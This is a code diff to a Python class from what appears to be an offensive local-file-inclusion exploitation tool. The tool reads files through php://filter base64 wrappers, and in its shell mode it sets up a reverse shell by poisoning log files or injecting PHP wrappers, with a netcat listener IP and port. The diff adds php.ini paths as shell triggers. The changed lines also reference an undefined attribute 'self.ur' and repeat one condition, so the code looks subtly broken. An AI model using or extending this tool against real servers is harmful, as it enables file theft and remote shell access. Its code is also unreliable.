@@ -163,7 +163,7 @@ class Read_File:
                     self.LFi = ''
                     if self.args.base64:
                         phpfillter = 'php://filter/read=convert.base64-encode/resource='
-                        URL = self.args.Vulnurl+ phpfillter
+                        URL = self.args.Vulnurl+ phpfillter   
                     else:    
                         URL = self.args.Vulnurl 
                     if '//' in LINE and not 'file' in LINE:  
@@ -229,15 +229,19 @@ class Read_File:
                                print("[+] save Locatoin       : ................ | : "+path+self.ip_re+"/"+self.args.read) 
                            if self.args.shell :
                                 if  "auth" in  self.url or "auth.log" in  self.url\
-                                or "environ" in self.url : 
+                                or "environ" in self.url or "environ" in self.url \
+                                or "/apache2/php.ini" in self.ur \
+                                or  "fpm/php.ini" in self.ur:  
                                     print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
                                     time.sleep(1)
                                     print("[+] Attack type          : ................ | : Reverse-Shell") 
                                     if self.args.port: 
                                         with open("./Package/shell/.port",'w') as port:
                                             port.write(self.args.port)
-                                
-                                    print("[+] Mothead              : ................ | : injecting log file  ")
+                                    if "php.ini" in self.url:
+                                        print("[+] Mothead              : ................ | : injecting PHP Wrappers  ")
+                                    else:
+                                        print("[+] Mothead              : ................ | : injecting log file  ")  
                                     print("[+] Lisliner Tool        : ................ | : NETCAT ")
                                     print("[+] Lisliner IP          : ................ | :",self.args.shell)   
                                     if not self.args.port:
@@ -281,15 +285,18 @@ class Read_File:
                                print("[+] save Locatoin       : ................ | : "+path+self.ip_re+'/'+self.args.read)              
                            if self.args.shell :
                                 if  "auth" in  self.url or "auth.log" in  self.url\
-                                or "environ" in self.url : 
+                                or "environ" in self.url or "/apache2/php.ini" in self.ur \
+                                or  "fpm/php.ini" in self.ur: 
                                     print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
                                     time.sleep(1)
                                     print("[+] Attack type          : ................ | : Reverse-Shell") 
                                     if self.args.port: 
                                         with open("./Package/shell/.port",'w') as port:
                                             port.write(self.args.port)
-                                
-                                    print("[+] Mothead              : ................ | : injecting log file  ")
+                                    if "php.ini" in self.url:
+                                        print("[+] Mothead              : ................ | : injecting PHP Wrappers  ")
+                                    else:
+                                        print("[+] Mothead              : ................ | : injecting log file  ")    
                                     print("[+] Lisliner Tool        : ................ | : NETCAT ")
                                     print("[+] Lisliner IP          : ................ | :",self.args.shell)   
                                     if not self.args.port:
